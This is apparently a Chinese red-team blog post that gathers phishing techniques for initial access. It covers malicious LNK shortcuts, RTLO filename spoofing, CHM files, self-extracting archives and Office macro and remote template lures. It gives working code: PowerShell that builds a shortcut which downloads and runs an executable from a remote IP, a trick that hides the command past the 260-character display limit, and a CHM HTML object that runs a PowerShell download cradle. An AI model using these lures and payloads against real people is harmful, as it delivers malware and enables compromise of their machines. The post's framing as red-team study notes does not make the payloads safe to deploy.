---
title: "Fishing"
date: 2021-01-04T22:14:26+08:00
draft: false
tags: [Fishing]
categories: [RedTeam]
comment: true
---
Fishing
<!--more-->

- 前言

**在常年攻防演练以及红蓝对抗中常被用于红方攻击的一种进行打点的方式，由于本人只是个安服仔，接触的比较少（但也不能不学），就有了这篇文章，参考各位大佬的姿势总结一下。**

## 钓鱼手段

### Lnk（快捷方式）

可以在“⽬标”栏写⼊⾃⼰的恶意命令，如powershell上线命令等，这里举例为CMD

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103160612.png)

当我点击谷歌浏览器时，弹出了CMD

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103160947.png)

可以进行更改图标

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103161253.png)

- 快速生成lnk样本

```
$WshShell = New-Object \-comObject WScript.Shell  
$Shortcut = $WshShell.CreateShortcut("test.lnk")  
$Shortcut.TargetPath = "%SystemRoot%\\system32\\cmd.exe"  
$Shortcut.IconLocation = "%SystemRoot%\\System32\\Shell32.dll,21"  
$Shortcut.Arguments = "cmd /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).DownloadFile('http://192.168.1.7:8000/ascotbe.exe','.\\\\ascotbe.exe');&cmd /c .\\\\ascotbe.exe"  
$Shortcut.Save()
```

运行

```
powershell -ExecutionPolicy RemoteSigned -file test.ps1
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103163314.png)


- Tips

**目标文件位置所能显示最大字符串为260个，所有我们可以把执行的命令放在260个字符后面**

```
$file = Get-Content ".\\test.txt"  
$WshShell = New-Object \-comObject WScript.Shell  
$Shortcut = $WshShell.CreateShortcut("test.lnk")  
$Shortcut.TargetPath = "%SystemRoot%\\system32\\cmd.exe"  
$Shortcut.IconLocation = "%SystemRoot%\\System32\\Shell32.dll,21"  
$Shortcut.Arguments = '                                                                                                                                                                                                                                      '\+ $file  
$Shortcut.Save()
```

## 文件后缀RTLO

**他会让字符串倒着编码**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103174703.png)

- 用Python一键生成用，把txt改为png后缀

```
import os  
os.rename('test.txt', 'test-\\u202egnp.txt')
```
```
import os
os.rename('cmd.exe', u'no\\u202eFDP.exe')
```

## CHM文档

创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个index.html文件，在两个文件夹内部创建各创建一个index.html文件。然后先将下列代码复制到根文件夹中的index.html中

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103180223.png)

- 在index.html文件中编辑

```
<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
command exec
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=',calc.exe'>
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```


- 使用cs生成修改模版中的calc.exe

```
<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
command exec
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.100:81/a'))">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```

- 使用EasyCHM编译

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103181650.png)

- 原有模版CMD

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103181750.png)

- ps上线

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103182926.png)

## 自解压

- 使用CS生成木马

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103183747.png)

- 创建自解压文件

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103184022.png)

- 高级自解压选项

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103184233.png)

- 解压路径-绝对路径

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103184310.png)

- 提取后运行

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103185602.png)

- 静默模式

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103184559.png)

- 更新模式

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103184719.png)

- 修改文件名

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103185941.png)

### ResourceHacker

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103190216.png)

- 打开flash安装文件导出资源

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103190401.png)

- 替换资源文件

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103190557.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103190647.png)

- 上线

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103190751.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103190834.png)

## office宏

### 本地加载

- 新建word，创建宏

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103191509.png)

- cs生成宏粘贴

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103191615.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103191756.png)

- 保存为启用宏的文档

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103191858.png)

- 打开文档上线

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103220610.png)
### 远程加载

编写一个带有宏代码的DOTM文档，并启用一个http服务将DOTM放置于web下
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210104090953.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210104091023.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210104091147.png)

-  新建一个任意的模版的docx文档并且解压

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210104091336.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210103222742.png)

- 编辑settings.xml.rels文件中的Target为我们第一个DOTM的http地址


![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210104092324.png)

- 重新压缩改后缀名为.docx

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210104092252.png)

- 模拟点击上线

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20210104185613.png)

## 参考

https://www.ascotbe.com/2020/07/26/office_0x01/#LNK%E9%92%93%E9%B1%BC

https://paper.seebug.org/1329/

[利用winrar自解压捆版payload制作免杀钓鱼木马](https://www.baikesec.com/webstudy/still/77.html)